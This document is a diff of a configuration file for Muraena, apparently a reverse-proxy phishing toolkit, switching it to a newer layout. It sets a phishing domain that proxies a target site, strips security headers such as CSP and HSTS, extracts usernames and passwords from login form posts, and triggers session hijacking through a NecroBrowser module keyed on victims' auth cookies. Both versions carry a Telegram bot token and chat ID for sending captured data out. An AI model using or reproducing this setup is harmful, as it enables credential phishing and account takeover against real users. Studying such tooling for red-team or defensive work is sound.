@@ -1,141 +1,135 @@
+#
+# Proxy
+# The proxy configuration controls how Muraena handles traffic routing between the phishing target and the
+# legitimate destination.
+# See: https://muraena.phishing.click/docs/proxy
+#
 [proxy]
     # Phishing domain
     phishing = "phishing.click"
 
     # Target domain to proxy
-    destination = "victim.site"
+    destination = "example.com"
 
     # Listening IP address (IPv4 or IPv6)
 	# e.g. 0.0.0.0 or [::]
-    IP = "127.0.0.1"
-
-	# Listen announces on the local network address.
-	# The network must be "tcp", "tcp4", "tcp6"
-	listener = "tcp4"
+    # Default 0.0.0.0
+    #IP = "127.0.0.1"
 
     # Listeninng TCP Port
-    port = 443
+    # Default 443 for HTTPS, 80 for HTTP
+    #port = 443
+
+	# Listen announces on the local network address.
+	# The network must be "tcp", "tcp4", "tcp6" (default "tcp").
+	# listener = "tcp4"
 
     #
     # Simple port forwarding used when the phishing site listen on a port different from target domain, such as:
     # - test.muraena:8443
     # - victim.site: 443
     #
-    # port mapping can be configured as follow: ListeningPort:TargetPort
+    # port mapping can be configured as follows:
+    # <ListeningPort>:<TargetPort>
     #portmapping = "443:31337"
 
     # Force HTTP to HTTPS redirection
     [proxy.HTTPtoHTTPS]
-    enabled = true
+    enable = true
     HTTPport = 80
 
+
 #
+# Origins
+# See: https://muraena.phishing.click/docs/origins
+#
+#[origins]
+# externalOriginPrefix = "cdn-"
+# externalOrigins = [ ]
+
+
+#
+# Transform
 # Proxy's replacement rules
+# See: https://muraena.phishing.click/docs/transform
 #
 [transform]
-
-    # List of content types to exclude from the transformation process
-    skipContentType = [ "font/*", "image/*" ]
-
     # Enable transformation rules in base64 strings
     [transform.base64]
-    enabled = false
-    padding = [ "=", "." ]
+        enable = false
+        padding = [ "=", "." ]
 
     [transform.request]
-        headers = [
-            "Cookie",
-            "Referer",
-            "Origin",
-            "X-Forwarded-For"
-        ]
+#        userAgent = "MuraenaProxy"
+#        headers = ["Cookie", "Referer", "Origin", "X-Forwarded-For"]
+#        remove.headers = [
+#            "X-FORWARDED-FOR",
+#            "X-FORWARDED-PROTO",
+#        ]
+#        add.headers = [
+#            {name = "X-Phishing", value = "via Muraena"},
+#        ]
 
     [transform.response]
-        headers = [
-            "Location",
-            "WWW-Authenticate",
-            "Origin",
-            "Set-Cookie",
-            "Access-Control-Allow-Origin"
-        ]
+        skipContentType = [ "font/*", "image/*" ]
 
-        # Generic replacement rules:
-        # it applies to body and any http header enabled for manipulation
-        content = [
-          [ "this is blue", "this is green" ]
-        ]
+#        headers = [
+#            "Location",
+#            "WWW-Authenticate",
+#            "Origin",
+#            "Set-Cookie",
+#            "Access-Control-Allow-Origin",
+#        ]
+#        customContent = [
+#            ["this is green","this is blue"],
+#        ]
+#
+#        remove.headers = [
+#            "X-XSS-Protection",
+#        ]
+#        add.headers = [
+#            {name = "X-Phishing", value = "via Muraena"},
+#        ]
 
 
 #
-# Proxy's wiping rules
+# Redirect
+# See: https://muraena.phishing.click/docs/redirect
 #
-[remove]
-
-    [remove.request]
-        headers = [
-            "X-Forwarded-For",
-			#"User-Agent"
-        ]
-
-    [remove.response]
-        headers = [
-            "Content-Security-Policy",
-            "Content-Security-Policy-Report-Only",
-            "Strict-Transport-Security",
-            "X-XSS-Protection",
-            "X-Content-Type-Options",
-            "X-Frame-Options",
-            "Referrer-Policy",
-            "X-Forwarded-For"
-        ]
-
-#
-# Proxy's crafting rules
-#
-[craft]
-	[craft.add]
-		[craft.add.request]
-			[[craft.add.request.headers]]
-				#name = "User-Agent"
-				#value = "Ninja Agent"
-
-		 [craft.add.response]
-			 [[craft.add.response.headers]]
-
-#
-# Rudimental redirection rules
-#
-[[drop]]
-    path = "/logout"
-    redirectTo = "https://victim.site"
-
-[[drop]]
-    path = "/signout"
-    redirectTo = "https://victim.site"
+#[redirect]
+#    [[redirect]]
+#        hostname = "phishing.click"
+#        path = "/login"
+#        query = "id=123"
+#        redirectTo = "https://poor.victim/login"
+#        httpStatusCode = 301
 
 
 #
 # LOG
+# See: https://muraena.phishing.click/docs/log
 #
 [log]
-    enabled = true
-    filePath = "muraena.log"
-
+    enable =true
+    # Default: "muraena.log"
+#    filePath = "muraena.log"
 
 
 #
-# DB (redis)
+# Redis
+# See: https://muraena.phishing.click/docs/redis
 #
-[redis]
-	host = "127.0.0.1"
-	port = 6379
-	password = ""
+#[redis]
+#	host = "" # default: "127.0.0."
+#	port =  # default: 6379
+#	password = "" # default: ""
 
 #
 # TLS
+# See: https://muraena.phishing.click/docs/tls
 #
 [tls]
-    enabled = true
+    enable =true
 
     # Expand allows to replace the content of the certificate/key/root parameters to their content instead of the
     # filepath
@@ -143,17 +137,19 @@
     certificate = "./config/cert.pem"
     key = "./config/privkey.pem"
     root = "./config/fullchain.pem"
+    sslKeyLog = "./config/sslkeylog.log"
 
 	#
 	# Danger zone, be careful editing these settings
 	#
 	# Minimum supported TLS version: SSL3.0, TLS1.0, TLS1.1, TLS1.2, TLS1.3
 	minVersion = "TLS1.2"
-	preferServerCipherSuites = true
-	sessionTicketsDisabled =  true
+#    maxVersion = "TLS1.3"
+#	preferServerCipherSuites = true
+#	sessionTicketsDisabled =  true
 	# InsecureSkipVerify controls whether muraena verifies the server's
 	# certificate chain and host name.
-	insecureSkipVerify = false
+#	insecureSkipVerify = false
 
 	# RenegotiationSupport
 	# Note: renegotiation is not defined in TLS 1.3.
@@ -163,115 +159,100 @@
 	# - Freely:			allows a remote server to repeatedly request renegotiation.
 	renegotiationSupport = "Never"
 
-#
-# CRAWLER
-#
-[crawler]
-    enabled = false
-    depth = 3
-    upto = 20
-    externalOriginPrefix = "www-"
-    externalOrigins = [
-      "*.anotherdomain.site",
-      "example.dev"
-    ]
-
-#
-# NECROBROWSER
-#
-[necrobrowser]
-    enabled = false
-    endpoint = "http://necrobrowser.url/xyz"
-    profile = "./config/instrument.necro"
-
-    [necrobrowser.keepalive]
-        # GET on an authenticated endpoint to keep the session alive
-        # every keepalive request is processed as its own necrotask
-        enabled = false
-        minutes = 5    # keeps alive the session every 5 minutes
 
 
-    [necrobrowser.trigger]
-        type = "cookies"
-        values = ["user_session", "dotcom_user"]  # values can be cookies names or relative paths
-        delay = 5   # check every 5 seconds victim's cookie jar to see if we need to instrument something
+#############################################################################
+# Modules
+#############################################################################
 
 #
-# STATIC SERVER
-#
-[staticServer]
-    enabled = false
-    port = 8080
-    localPath = "./static/"
-    urlPath = "/evilpath/"
-
-
-#
-# WATCHDOG
-#
-[watchdog]
-	enabled = true
-	# Monitor rules file changes and reload
-	dynamic = true
-	rules = "./config/watchdog.rules"
-	geoDB = "./config/geoDB.mmdb"
-
-#
-# TRACKING
+# Tracking
+# See: https://muraena.phishing.click/modules/tracker
 #
 [tracking]
-enabled = false
+    enable =false
+    trackRequestCookie = true
 
-    # Tracking types can be Path || Query (default)
-    #
-    # query:
-    #  ?identifier=trackingID
-    #
-    # path:
-    #   /trackingID
-    #
-    type = "query"
+    [tracking.trace]
+        # Tracking identifier
+        identifier = "_gat"
+        # Rule to generate and validate a tracking identifier
+        validator = "[a-zA-Z0-9]{5}"
+        # Tracking initial HTTP Header (empty is: If-Range)
+        header = "X-Whatveryouwant-Header"
+        # Set tracking cookie for a custom domain
+        # domain = ""
 
-    # Tracking identifier
-    identifier = "_gat"
+        [tracking.trace.landing]
+            # Tracking types can be Path || Query (default)
+            #
+            # query:
+            #  ?identifier=trackingID
+            #
+            # path:
+            #   /trackingID
+            #
+            type = "query"
+            # Landing HTTP Header (empty is: X-If-Landing-Redirect)
+            header = "X-Whatveryouwant-Landing-Header"
 
-    # Rule to generate and validate a tracking identifier
-    regex = "[a-zA-Z0-9]{5}"
+            # redirect url once the landing is detected (applicable only if type is path)
+            # redirectTo = "https://www.google.com"
 
-	# Tracking initial HTTP Header (empty is: If-Range)
-	header = "X-Whatveryouwant-Header"
+[tracking.secrets]
+        paths = ["/login", "/submit"]
 
-	# Landing HTTP Header (empty is: X-If-Landing-Redirect)
-	landing = "X-Whatveryouwant-Landing-Header"
-
-    # Set speific victim's IP address
-    # ipSource = ""
-
-    # Set tracking cookie for a custom domain
-    # domain = ""
-
-    [tracking.urls]
-    credentials = [ "/session" ]
-    authSession = [ "/settings/profile" ]
-
-    [[tracking.patterns]]
-    label = "Username"
-    matching = "login"
-    start = "login="
-    end = "&password="
-
-    [[tracking.patterns]]
-    label = "Password"
-    matching = "password"
-    start = "password="
-    end = "&"
+        [[tracking.secrets.patterns]]
+        label = "Credential Capture - Username"
+        start = "username="
+        end = "&"
 
 
 
 #
-# TELEGRAM
+# NecroBrowser
+# See: https://muraena.phishing.click/modules/necrobrowser
 #
-[telegram]
-enabled = true
-botToken = "1587304999:AAG4cH8VzJ1b8tbamq0VZM9C01KkDjY5IFo"
-chatIDs = ["-1001856562703"]
+#[necrobrowser]
+#    enable = true
+#
+#    [necrobrowser.urls]
+#    authSession = ["/settings/profile"]
+#    authSessionResponse = ["/privacypolicy"]
+#
+#
+#    # Endpoint should be the internal one used via WG
+#    endpoint = "http://10.0.0.2:3000/instrument"
+#    profile = "./config/instrument.necro"
+#
+#    [necrobrowser.trigger]
+#    type = "cookie"
+#    values = ["ESAUTHENTICATED"]
+#    delay = 5
+
+
+#
+# Static Server
+# See: https://muraena.phishing.click/modules/staticserver
+#
+#[staticServer]
+#    enable =false
+#    localPath = "./static/"
+#    urlPath = "/evilpath/"
+
+#
+# Watchdog
+# See: https://muraena.phishing.click/modules/watchdog
+#[watchdog]
+#	enable =true
+#	dynamic = true
+#	rules = "./config/watchdog.rules"
+#	geoDB = "./config/geoDB.mmdb"
+
+#
+# Telegram
+# See: https://muraena.phishing.click/modules/telegram
+#[telegram]
+#    enable =true
+#    botToken = "1587304999:AAG4cH8VzJ1b8tbamq0VZM9C01KkDjY5IFo"
+#    chatIDs = ["-1001856562703"]
